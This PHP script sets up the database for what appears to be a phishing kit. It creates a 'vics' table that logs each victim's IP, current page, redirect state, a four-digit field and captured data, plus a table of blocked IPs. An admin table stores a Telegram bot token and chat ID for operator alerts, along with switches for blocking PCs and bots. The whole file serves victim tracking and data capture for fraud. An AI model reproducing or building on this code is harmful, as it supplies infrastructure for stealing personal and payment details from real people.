<?php 
require (__DIR__).'/../../config.php';	
$table = "vics";

if(strtolower($local_db)=="on"){
	$DB_PATH = (__DIR__)."/database/Jeehan.db";
	$pdo = new PDO("sqlite:".$DB_PATH);
$vicsTable= "
create table if not exists $table(
id integer primary key autoincrement ,
user_id varchar (200),
ip varchar (100),
redirect intger default 0,
current_page varchar(200),
fourdigits varchar(4),
data text,
last_act  varchar(100)
);";
$blockedTable="
create table if not exists blockedvics(
id integer primary key autoincrement,
ip varchar(100)
);";
$admintable = "
create table if not exists adminInfo(
id integer primary key ,
telegram_bot varchar(200),
chat_id text,
block_pc integer default 1,
notifications integer default 1,
shutdown integer default 0,
allow_bots integer default 1
);";

$insertAdmin = "insert into adminInfo(id) select '1' where not exists (select id from adminInfo);";

}else{
	$pdo = new PDO("mysql:host=".DB_HOST."; dbname=".DB_NAME, DB_USER, DB_PASS);
$vicsTable = "
create table if not exists $table(
id integer not null auto_increment primary key,
user_id varchar(200),
ip varchar(100),
redirect int default 0,
current_page varchar(200),
fourdigits varchar(4),
data text,
last_act varchar(100)
);";
$blockedTable="
create table if not exists blockedvics(
id integer not null auto_increment primary key,
ip varchar(100)
);";
$admintable = "
create table if not exists adminInfo(
id int auto_increment primary key,
telegram_bot varchar(200),
chat_id text,
block_pc int default 1,
notifications int default 1,
shutdown int default 0,
allow_bots int default 1
);";
$insertAdmin = "insert into adminInfo(id) select '1' where not exists (select id from adminInfo);";

}


$pdo->query($vicsTable);
$pdo->query($blockedTable);
$pdo->query($admintable);
$pdo->query($insertAdmin);


?>